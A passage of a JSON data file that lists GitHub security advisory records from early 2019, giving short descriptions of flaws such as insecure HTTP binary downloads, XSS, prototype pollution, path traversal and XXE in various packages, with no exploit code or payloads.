    "description": "google-closure-tools-latest is a Node.js module wrapper for downloading the latest version of the Google Closure tools google-closure-tools-latest downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects google-closure-tools-latest"
  },
  {
    "ghsaId": "GHSA-vcph-57hv-89c4",
    "publishedAt": "2019-02-18T23:42:11Z",
    "description": "serc.js is a Selenium RC process wrapper serc.js downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects serc.js"
  },
  {
    "ghsaId": "GHSA-g7w9-vm5m-48q8",
    "publishedAt": "2019-02-18T23:42:09Z",
    "description": "arcanist downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Moderate severity vulnerability that affects arcanist"
  },
  {
    "ghsaId": "GHSA-j336-34q7-cgj3",
    "publishedAt": "2019-02-18T23:42:06Z",
    "description": "healthcenter - IBM Monitoring and Diagnostic Tools health Center agent healthcenter downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects healthcenter"
  },
  {
    "ghsaId": "GHSA-fwhp-2hqr-6g72",
    "publishedAt": "2019-02-18T23:42:01Z",
    "description": "pk-app-wonderbox is an integration with wonderbox pk-app-wonderbox downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects pk-app-wonderbox"
  },
  {
    "ghsaId": "GHSA-w9mf-24h3-9wxf",
    "publishedAt": "2019-02-18T23:41:58Z",
    "description": "The windows-iedriver module downloads fixed version of iedriverserver.exe windows-iedriver downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects windows-iedriver"
  },
  {
    "ghsaId": "GHSA-xj6f-x7jm-85ff",
    "publishedAt": "2019-02-18T23:41:54Z",
    "description": "openframe-ascii-image module is an openframe plugin which adds support for ascii images via fim. openframe-ascii-image downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects openframe-ascii-image"
  },
  {
    "ghsaId": "GHSA-2mvm-66q7-m256",
    "publishedAt": "2019-02-18T23:40:25Z",
    "description": "selenium-download downloads the latest versions of the selenium standalone server and the chromedriver. selenium-download before 2.0.7 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects selenium-download"
  },
  {
    "ghsaId": "GHSA-hc94-2wfr-4pwf",
    "publishedAt": "2019-02-18T23:40:19Z",
    "description": "appium-chromedriver is a Node.js wrapper around Chromedriver. Versions below 2.9.4 download binary resources over HTTP, which leaves the module vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects appium-chromedriver"
  },
  {
    "ghsaId": "GHSA-2r5h-gh4x-8hp9",
    "publishedAt": "2019-02-18T23:40:14Z",
    "description": "igniteui 0.0.5 and earlier downloads JavaScript and CSS resources over insecure protocol.",
    "summary": "Low severity vulnerability that affects igniteui"
  },
  {
    "ghsaId": "GHSA-qmv4-jgp7-mf68",
    "publishedAt": "2019-02-18T23:40:10Z",
    "description": "Sails is an MVC style framework for building realtime web applications. Version 0.12.7 and lower have an issue with the CORS configuration where the value of the origin header is reflected as the value for the Access-Control-Allow-Origin header. This would allow an attacker to make AJAX requests to vulnerable hosts through cross site scripting or a malicious HTML Document, effectively bypassing the Same Origin Policy. Note that this is only an issue when `allRoutes` is set to `true` and `origin` is set to `*` or left commented out in the sails CORS config file. The problem can be compounded when the cors `credentials` setting is not provided. At that point authenticated cross domain requests are possible.",
    "summary": "High severity vulnerability that affects sails"
  },
  {
    "ghsaId": "GHSA-84fv-prrc-5ggr",
    "publishedAt": "2019-02-18T23:40:04Z",
    "description": "call is an HTTP router that is primarily used by the hapi framework. There exists a bug in call versions 2.0.1-3.0.1 that does not validate empty parameters, which could result in invalid input bypassing the route validation rules.",
    "summary": "Moderate severity vulnerability that affects call"
  },
  {
    "ghsaId": "GHSA-6cpc-mj5c-m9rq",
    "publishedAt": "2019-02-18T23:40:03Z",
    "description": "The package `node-cli` before 1.0.0 insecurely uses the lock_file and log_file. Both of these are temporary, but it allows the starting user to overwrite any file they have access to.",
    "summary": "Low severity vulnerability that affects cli"
  },
  {
    "ghsaId": "GHSA-j6p2-cx3w-6jcp",
    "publishedAt": "2019-02-18T23:39:55Z",
    "description": "backbone is a module that adds in structure to a JavaScript heavy application through key-value pairs and custom events connecting to your RESTful API through JSON There exists a potential Cross Site Scripting vulnerability in the `Model#Escape` function of backbone 0.3.3 and earlier, if a user is able to supply input. This is due to the regex that's replacing things to miss the conversion of things such as `<` to `<`.",
    "summary": "Moderate severity vulnerability that affects backbone"
  },
  {
    "ghsaId": "GHSA-4r4m-hjwj-43p8",
    "publishedAt": "2019-02-18T23:39:50Z",
    "description": "engine.io-client is the client for engine.io, the implementation of a transport-based cross-browser/cross-device bi-directional communication layer for Socket.IO. The vulnerability is related to the way that node.js handles the `rejectUnauthorized` setting. If the value is something that evaluates to false, certificate verification will be disabled. This is problematic as engine.io-client 1.6.8 and earlier passes in an object for settings that includes the rejectUnauthorized property, whether it has been set or not. If the value has not been explicitly changed, it will be passed in as `null`, resulting in certificate verification being turned off.",
    "summary": "Moderate severity vulnerability that affects engine.io-client"
  },
  {
    "ghsaId": "GHSA-hjhr-r3gq-qvp6",
    "publishedAt": "2019-02-18T23:39:44Z",
    "description": "csrf-lite is a cross-site request forgery protection library for framework-less node sites. csrf-lite uses `===`, a fail first string comparison, instead of a time constant string comparison This enables an attacker to guess the secret in no more than (16*18)288 guesses, instead of the 16^18 guesses required were the timing attack not present.",
    "summary": "Moderate severity vulnerability that affects csrf-lite"
  },
  {
    "ghsaId": "GHSA-q52j-4q2q-hcj6",
    "publishedAt": "2019-02-18T23:39:39Z",
    "description": "console-io is a module that allows users to implement a web console in their application. A malicious user could bypass the authentication and execute any command that the user who is running the console-io application 2.2.13 and earlier is able to run. This means that if console-io was running from root, the attacker would have full access to the system. This vulnerability exists because the console-io application does not configure socket.io to require authentication, which allows a malicious user to connect via a websocket to send commands and receive the response.",
    "summary": "High severity vulnerability that affects console-io"
  },
  {
    "ghsaId": "GHSA-rhvc-x32h-5526",
    "publishedAt": "2019-02-18T23:39:32Z",
    "description": "Droppy versions <3.5.0 does not perform any verification for cross-domain websocket requests. An attacker is able to make a specially crafted page that can send requests as the context of the currently logged in user. For example this means the malicious user could add a new admin account under his control and delete others.",
    "summary": "Moderate severity vulnerability that affects droppy"
  },
  {
    "ghsaId": "GHSA-xg5r-8j97-2wrj",
    "publishedAt": "2019-02-18T23:39:22Z",
    "description": "restafary is a REpresentful State Transfer API for Creating, Reading, Using, Deleting files on a server from the web. Restafary before 1.6.1 is able to set up a root path, which should only allow it to run inside of that root path it specified.",
    "summary": "Moderate severity vulnerability that affects restafary"
  },
  {
    "ghsaId": "GHSA-pp4v-55vr-9gxh",
    "publishedAt": "2019-02-18T23:39:13Z",
    "description": "The riot-compiler version version 2.3.21 has an issue in a regex (Catastrophic Backtracking) thats make it unusable under certain conditions.",
    "summary": "Moderate severity vulnerability that affects riot-compiler"
  },
  {
    "ghsaId": "GHSA-rrj3-qmh8-72pf",
    "publishedAt": "2019-02-18T23:39:11Z",
    "description": "A common setup to deploy to gh-pages on every commit via a CI system is to expose a github token to ENV and to use it directly in the auth part of the url. In module versions < 0.9.1 the auth portion of the url is outputted as part of the grunt tasks logging function. If this output is publicly available then the credentials should be considered compromised.",
    "summary": "Moderate severity vulnerability that affects grunt-gh-pages"
  },
  {
    "ghsaId": "GHSA-97gv-3p2c-xw7j",
    "publishedAt": "2019-02-18T23:39:06Z",
    "description": "i18n-node-angular is a module used to interact between i18n and angular without using additional resources. A REST API endpoint that is used for development in i18n-node-angular before 1.4.0 was not disabled in production environments a malicious user could fill up the server causing a Denial of Service or content injection.",
    "summary": "High severity vulnerability that affects i18n-node-angular"
  },
  {
    "ghsaId": "GHSA-mg8r-9g6j-hwv9",
    "publishedAt": "2019-02-18T23:39:00Z",
    "description": "When attempting to allow authentication mode `try` in hapi, hapi-auth-jwt2 version 5.1.1 introduced an issue whereby people could bypass authentication.",
    "summary": "High severity vulnerability that affects hapi-auth-jwt2"
  },
  {
    "ghsaId": "GHSA-xj62-87pg-vcv3",
    "publishedAt": "2019-02-18T23:38:51Z",
    "description": "jshamcrest is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in to the emailAddress validator.",
    "summary": "High severity vulnerability that affects jshamcrest"
  },
  {
    "ghsaId": "GHSA-g3r2-65gc-qpqc",
    "publishedAt": "2019-02-18T23:38:45Z",
    "description": "MQTT before 3.4.6 and 4.0.x before 4.0.5 allows specifically crafted MQTT packets to crash the application, making a DoS attack feasible with very little bandwidth.",
    "summary": "High severity vulnerability that affects mqtt-packet"
  },
  {
    "ghsaId": "GHSA-6354-6mhv-mvv5",
    "publishedAt": "2019-02-18T23:38:38Z",
    "description": "jadedown is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in.",
    "summary": "High severity vulnerability that affects jadedown"
  },
  {
    "ghsaId": "GHSA-f5mh-hq6h-whxv",
    "publishedAt": "2019-02-18T23:38:29Z",
    "description": "Bitty is a development web server tool that functions similar to `python -m SimpleHTTPServer`. Version 0.2.10 has a directory traversal vulnerability that is exploitable via the URL path in GET requests.\r\n\r\nThe bitty package is not currently maintained, and has not seen an update since 2015.\r\n\r\nAt this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality, such as serve.",
    "summary": "Moderate severity vulnerability that affects bitty"
  },
  {
    "ghsaId": "GHSA-2wrq-wmqf-8vcc",
    "publishedAt": "2019-02-18T23:35:48Z",
    "description": "operadriver is a Opera Driver for Selenium. operadriver versions below 0.2.3 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects operadriver"
  },
  {
    "ghsaId": "GHSA-h2r4-4xgf-3865",
    "publishedAt": "2019-02-18T23:35:32Z",
    "description": "product-monitor is a HTML/JavaScript template for monitoring a product by encouraging product developers to gather all the information about the status of a product, including live monitoring, statistics, endpoints, and test results into one place. product-monitor versions below 2.2.5 download JavaScript resources over HTTP, which leaves the module vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested JavaScript file with an attacker controlled JavaScript file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects product-monitor"
  },
  {
    "ghsaId": "GHSA-mq7g-6rv4-pj95",
    "publishedAt": "2019-02-18T23:35:23Z",
    "description": "embedza is a module to create HTML snippets/embeds from URLs using info from oEmbed, Open Graph, meta tags. embedza versions below 1.2.4 download JavaScript resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested JavaScript file with an attacker controlled JavaScript file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects embedza"
  },
  {
    "ghsaId": "GHSA-6pwf-whc8-hjf6",
    "publishedAt": "2019-02-18T23:35:18Z",
    "description": "baryton-saxophone is a module to install and launch Selenium Server for Mac, Linux and Windows. baryton-saxophone versions below 3.0.1 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects baryton-saxophone"
  },
  {
    "ghsaId": "GHSA-h7pc-85cg-wmch",
    "publishedAt": "2019-02-18T23:35:10Z",
    "description": "Kindlegen is a simple Node.js wrapper of the official kindlegen program. Kindlegen versions before 1.1.0 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects kindlegen"
  },
  {
    "ghsaId": "GHSA-5m9c-634g-47vq",
    "publishedAt": "2019-02-18T23:35:01Z",
    "description": "Steroids is PhoneGap on Steroids, providing native UI elements, multiple WebViews and enhancements for better developer productivity. steroids downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested tarball with an attacker controlled tarball if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects steroids"
  },
  {
    "ghsaId": "GHSA-7vrq-vg6p-32fw",
    "publishedAt": "2019-02-18T23:34:48Z",
    "description": "libxl provides Node bindings for the libxl library for reading and writing excel (XLS and XLSX) spreadsheets. libxl downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled zip file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects libxl"
  },
  {
    "ghsaId": "GHSA-rh7p-9c79-gpp8",
    "publishedAt": "2019-02-18T23:34:44Z",
    "description": "wasdk is a toolkit for creating WebAssembly modules. wasdk downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects wasdk"
  },
  {
    "ghsaId": "GHSA-h4mc-r4f4-hcf4",
    "publishedAt": "2019-02-18T23:34:37Z",
    "description": "selenium-binaries downloads Selenium related binaries for your OS. selenium-binaries downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.\r\n\r\nNo fix is currently available for this vulnerability.\r\n\r\nThe best mitigation currently available is to use an alternate package, such as selenium-webdriver, the official selenium bindings for node.js.",
    "summary": "High severity vulnerability that affects selenium-binaries"
  },
  {
    "ghsaId": "GHSA-cr79-9pwf-r6f5",
    "publishedAt": "2019-02-18T23:34:24Z",
    "description": "Prince is a Node API for executing XML/HTML to PDF renderer PrinceXML via prince(1) CLI. prince downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested tarball with an attacker controlled tarball if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects prince"
  },
  {
    "ghsaId": "GHSA-92qm-hc53-jjrj",
    "publishedAt": "2019-02-18T23:34:17Z",
    "description": "ibapi is an Interactive Brokers API addon for NodeJS. ibapi downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects ibapi"
  },
  {
    "ghsaId": "GHSA-8cc8-8vvx-fhgw",
    "publishedAt": "2019-02-18T23:34:11Z",
    "description": "jdf-sass is a fork from node-sass, jdf use only. jdf-sass downloads executable resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested file with an attacker controlled file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects jdf-sass"
  },
  {
    "ghsaId": "GHSA-rwvj-jgc4-fqq5",
    "publishedAt": "2019-02-18T23:34:05Z",
    "description": "cobalt-cli downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects cobalt-cli"
  },
  {
    "ghsaId": "GHSA-mq76-m7gv-xhfm",
    "publishedAt": "2019-02-18T23:34:00Z",
    "description": "sauce-connect is a Node.js wrapper over the SauceLabs SauceConnect.jar program for establishing a secure tunnel for intranet testing. sauce-connect downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects sauce-connect"
  },
  {
    "ghsaId": "GHSA-wr2c-ppj9-f2fv",
    "publishedAt": "2019-02-18T23:33:54Z",
    "description": "webdrvr is a npm wrapper for Selenium Webdriver including Chromedriver / IEDriver / IOSDriver / Ghostdriver. webdrvr downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects webdrvr"
  },
  {
    "ghsaId": "GHSA-6jx3-rqcx-g3ww",
    "publishedAt": "2019-02-18T23:33:48Z",
    "description": "air-sdk is a NPM wrapper for the Adobe AIR SDK. air-sdk downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects air-sdk"
  },
  {
    "ghsaId": "GHSA-g2pf-qjgf-6fw3",
    "publishedAt": "2019-02-18T23:33:42Z",
    "description": "openframe-glsviewer is a Openframe extension which adds support for shaders via glslViewer. openframe-glsviewer downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects openframe-glslviewer"
  },
  {
    "ghsaId": "GHSA-jppx-hw2f-8gx4",
    "publishedAt": "2019-02-18T23:33:30Z",
    "description": "chromedriver126 is chromedriver version 1.26 for linux OS. chromedriver126 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects chromedriver126"
  },
  {
    "ghsaId": "GHSA-v569-g72v-q434",
    "publishedAt": "2019-02-12T17:26:12Z",
    "description": "In Apache Hadoop 3.0.0-alpha1 to 3.0.0, 2.9.0, 2.8.0 to 2.8.3, and 2.5.0 to 2.7.5, HDFS exposes extended attribute key/value pairs during listXAttrs, verifying only path-level search access to the directory rather than path-level read permission to the referent.",
    "summary": "Low severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-w5m8-5v9m-xhx5",
    "publishedAt": "2019-02-12T17:26:10Z",
    "description": "Haraka version 2.8.8 and earlier comes with a plugin for processing attachments for zip files. Versions 2.8.8 and earlier can be vulnerable to command injection.",
    "summary": "Critical severity vulnerability that affects Haraka"
  },
  {
    "ghsaId": "GHSA-5q75-cxcq-wr26",
    "publishedAt": "2019-02-12T17:26:07Z",
    "description": "A carefully crafted URL could trigger an XSS vulnerability on Apache JSPWiki, from versions up to 2.10.5, which could lead to session hijacking.",
    "summary": "Low severity vulnerability that affects org.apache.jspwiki:jspwiki-war"
  },
  {
    "ghsaId": "GHSA-vqmr-957g-r7w3",
    "publishedAt": "2019-02-12T15:36:39Z",
    "description": "Installed packages are exposed by node_modules in Rendertron 1.0.0, allowing remote attackers to read absolute paths on the server by examining the \"_where\" attribute of package.json files.",
    "summary": "High severity vulnerability that affects rendertron"
  },
  {
    "ghsaId": "GHSA-wh4h-v3f2-r2pp",
    "publishedAt": "2019-02-12T15:36:37Z",
    "description": "Django 1.11.x before 1.11.19, 2.0.x before 2.0.11, and 2.1.x before 2.1.6 allows Uncontrolled Memory Consumption via a malicious attacker-supplied value to the django.utils.numberformat.format() function.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-xwjh-cp99-cj8q",
    "publishedAt": "2019-02-12T15:36:35Z",
    "description": "Directory traversal vulnerability in cordova-plugin-ionic-webview versions prior to 2.2.0 (not including 2.0.0-beta.0, 2.0.0-beta.1, 2.0.0-beta.2, and 2.1.0-0) allows remote attackers to access arbitrary files via unspecified vectors.",
    "summary": "High severity vulnerability that affects cordova-plugin-ionic-webview"
  },
  {
    "ghsaId": "GHSA-32f7-cmr3-vpjv",
    "publishedAt": "2019-02-07T18:18:30Z",
    "description": "**Withdrawn:** Duplicate of GHSA-6m9g-jr8c-cqw3",
    "summary": "Moderate severity vulnerability that affects aioxmpp"
  },
  {
    "ghsaId": "GHSA-rv95-4wxj-6fqq",
    "publishedAt": "2019-02-07T18:18:22Z",
    "description": "In Pylons Colander through 1.6, the URL validator allows an attacker to potentially cause an infinite loop thereby causing a denial of service via an unclosed parenthesis.",
    "summary": "Low severity vulnerability that affects colander"
  },
  {
    "ghsaId": "GHSA-45j8-pm75-5v8x",
    "publishedAt": "2019-02-07T18:18:04Z",
    "description": "A path traversal vulnerability was found in module static-resource-server 1.7.2 that allows unauthorized read access to any file on the server by appending slashes in the URL.",
    "summary": "Low severity vulnerability that affects static-resource-server"
  },
  {
    "ghsaId": "GHSA-r96c-57pf-9jjm",
    "publishedAt": "2019-02-07T18:17:34Z",
    "description": "A prototype pollution vulnerability was found in node.extend <1.1.7, ~<2.0.1 that allows an attacker to inject arbitrary properties onto Object.prototype.",
    "summary": "Low severity vulnerability that affects node.extend"
  },
  {
    "ghsaId": "GHSA-h466-j336-74wx",
    "publishedAt": "2019-02-07T18:17:26Z",
    "description": "A prototype pollution vulnerability was found in module mpath <0.5.1 that allows an attacker to inject arbitrary properties onto Object.prototype.",
    "summary": "Low severity vulnerability that affects mpath"
  },
  {
    "ghsaId": "GHSA-675m-85rw-j3w4",
    "publishedAt": "2019-02-07T18:17:12Z",
    "description": "A prototype pollution vulnerability was found in just-extend <4.0.0 that allows attack to inject properties onto Object.prototype through its functions.",
    "summary": "Low severity vulnerability that affects just-extend"
  },
  {
    "ghsaId": "GHSA-4xc9-xhrj-v574",
    "publishedAt": "2019-02-07T18:16:48Z",
    "description": "A prototype pollution vulnerability was found in lodash <4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.",
    "summary": "Low severity vulnerability that affects lodash"
  },
  {
    "ghsaId": "GHSA-pjxw-22xf-6pwc",
    "publishedAt": "2019-02-07T18:16:38Z",
    "description": "A prototype pollution vulnerability was found in defaults-deep <=0.2.4 that would allow a malicious user to inject properties onto Object.prototype.",
    "summary": "Low severity vulnerability that affects defaults-deep"
  },
  {
    "ghsaId": "GHSA-gmxv-xf2q-6j8m",
    "publishedAt": "2019-02-07T18:16:16Z",
    "description": "A XSS vulnerability was found in module m-server <1.4.2 that allows malicious Javascript code or HTML to be executed, due to the lack of escaping for special characters in folder names.",
    "summary": "Low severity vulnerability that affects m-server"
  },
  {
    "ghsaId": "GHSA-wj36-v8j4-pc7c",
    "publishedAt": "2019-02-07T18:16:03Z",
    "description": "A deficiency in the access control in module express-cart <=1.1.5 allows unprivileged users to add new users to the application as administrators.",
    "summary": "Low severity vulnerability that affects express-cart"
  },
  {
    "ghsaId": "GHSA-cxmj-qjv6-vx9p",
    "publishedAt": "2019-02-07T18:15:44Z",
    "description": "A server directory traversal vulnerability was found on node module mcstatic <=0.0.20 that would allow an attack to access sensitive information in the file system by appending slashes in the URL path.",
    "summary": "Low severity vulnerability that affects mcstatic"
  },
  {
    "ghsaId": "GHSA-5p26-hw7f-3cpr",
    "publishedAt": "2019-02-07T18:14:44Z",
    "description": "A XSS vulnerability was found in html-pages that allows malicious Javascript code to be executed in the user's browser due to the absence of sanitization of the paths before rendering.",
    "summary": "Low severity vulnerability that affects html-pages"
  },
  {
    "ghsaId": "GHSA-649c-x44h-4q7v",
    "publishedAt": "2019-02-07T18:14:37Z",
    "description": "A XSS vulnerability was found in module public <0.1.4 that allows malicious Javascript code to run in the browser, due to the absence of sanitization of the file/folder names before rendering.",
    "summary": "Low severity vulnerability that affects public"
  },
  {
    "ghsaId": "GHSA-7c9w-qmrq-ff8r",
    "publishedAt": "2019-02-07T18:14:21Z",
    "description": "Path traversal vulnerability in http-live-simulator <1.0.7 causes unauthorized access to arbitrary files on disk by appending extra slashes after the URL.",
    "summary": "Low severity vulnerability that affects http-live-simulator"
  },
  {
    "ghsaId": "GHSA-qrmc-fj45-qfc2",
    "publishedAt": "2019-02-07T18:03:28Z",
    "description": "A prototype pollution vulnerability was found in module extend <2.0.2, ~<3.0.2 that allows an attacker to inject arbitrary properties onto Object.prototype.",
    "summary": "Low severity vulnerability that affects extend"
  },
  {
    "ghsaId": "GHSA-fvxv-9xxr-h7wj",
    "publishedAt": "2019-02-07T18:02:21Z",
    "description": "When using PySpark , it's possible for a different local user to connect to the Spark application and impersonate the user running the Spark application. This affects versions 1.x, 2.0.x, 2.1.x, 2.2.0 to 2.2.2, and 2.3.0 to 2.3.1.",
    "summary": "Moderate severity vulnerability that affects pyspark"
  },
  {
    "ghsaId": "GHSA-hhxm-4f85-rgr8",
    "publishedAt": "2019-02-05T16:25:34Z",
    "description": "### Logs password in plaintext\r\n\r\n### Impact\r\n\r\nLogs the password used in plaintext.  The password should masked in logs to prevent it leaking.\r\n\r\n### Patches\r\nHas the problem been patched? What versions should users upgrade to?\r\n\r\n### Workarounds\r\nnone\r\n\r\n### See also\r\nAre there any links users can visit to find out more information?\r\n\r\n\r\n#### Package Ecosystem\r\nRubyGems\r\n\r\n#### Package Name\r\nmany_versioned_gem\r\n\r\n#### Affected Versions\r\n< 0.2.2\r\n\r\n#### Patches\r\n0.2.3",
    "summary": "High severity vulnerability that affects many_versioned_gem"
  },
  {
    "ghsaId": "GHSA-mh24-7wvg-v88g",
    "publishedAt": "2019-01-30T20:56:26Z",
    "description": "CRLF Injection in pypiserver 1.2.5 and below allows attackers to set arbitrary HTTP headers and possibly conduct XSS attacks via a %0d%0a in a URI.",
    "summary": "Low severity vulnerability that affects pypiserver"
  },
  {
    "ghsaId": "GHSA-77rc-x84q-pv4f",
    "publishedAt": "2019-01-25T16:19:19Z",
    "description": "The LDAP auth backend (airflow.contrib.auth.backends.ldap_auth) prior to Apache Airflow 1.10.1 was misconfigured and contained improper checking of exceptions which disabled server certificate checking.",
    "summary": "Low severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-68wv-rjrm-576p",
    "publishedAt": "2019-01-25T16:19:14Z",
    "description": "In Apache Airflow 1.8.2 and earlier, a CSRF vulnerability allowed for a remote command injection on a default install of Airflow.",
    "summary": "Low severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-9gqg-3fxr-9hv7",
    "publishedAt": "2019-01-25T16:19:09Z",
    "description": "In Apache Airflow 1.8.2 and earlier, an experimental Airflow feature displayed authenticated cookies, as well as passwords to databases used by Airflow. An attacker who has limited access to airflow, weather it be via XSS or by leaving a machine unlocked can exfil all credentials from the system.",
    "summary": "Low severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-8fg4-j562-mjrc",
    "publishedAt": "2019-01-25T16:19:01Z",
    "description": "In Apache Airflow 1.8.2 and earlier, an authenticated user can execute code remotely on the Airflow webserver by creating a special object.",
    "summary": "Low severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-3wc8-659g-r88q",
    "publishedAt": "2019-01-25T16:18:56Z",
    "description": "Spring Batch versions 3.0.9, 4.0.1, 4.1.0, and older unsupported versions, were susceptible to XML External Entity Injection (XXE) when receiving XML data from untrusted sources.",
    "summary": "Low severity vulnerability that affects org.springframework.batch:spring-batch-core"
  },
  {
    "ghsaId": "GHSA-8222-6fc8-mhvf",
    "publishedAt": "2019-01-25T16:18:52Z",
    "description": "Spring Web Services, versions 2.4.3, 3.0.4, and older unsupported versions of all three projects, were susceptible to XML External Entity Injection (XXE) when receiving XML data from untrusted sources.",
    "summary": "Low severity vulnerability that affects org.springframework.ws:spring-ws and org.springframework.ws:spring-xml"
  },
  {
    "ghsaId": "GHSA-wr5r-m8pc-85j9",
    "publishedAt": "2019-01-25T16:18:49Z",
    "description": "Spring Integration (spring-integration-xml and spring-integration-ws modules), versions 4.3.18, 5.0.10, 5.1.1, and older unsupported versions, were susceptible to XML External Entity Injection (XXE) when receiving XML data from untrusted sources.",
    "summary": "Low severity vulnerability that affects org.springframework.integration:spring-integration-ws and org.springframework.integration:spring-integration-xml"
  },
  {
    "ghsaId": "GHSA-6qvp-r6r3-9p7h",
    "publishedAt": "2019-01-17T14:05:03Z",
    "description": "A NULL pointer dereference vulnerability exists in the xpath.c:xmlXPathCompOpEval() function of libxml2 through 2.9.8 when parsing an invalid XPath expression in the XPATH_OP_AND or XPATH_OP_OR case. Applications processing untrusted XSL format inputs with the use of the libxml2 library may be vulnerable to a denial of service attack due to a crash of the application.",
    "summary": "Moderate severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-ph58-4vrj-w6hr",
    "publishedAt": "2019-01-17T13:57:56Z",
    "description": "In Bootstrap before 3.4.0, XSS is possible in the affix configuration target property.",
    "summary": "Low severity vulnerability that affects bootstrap"
  },
  {
    "ghsaId": "GHSA-3mgp-fx93-9xv5",
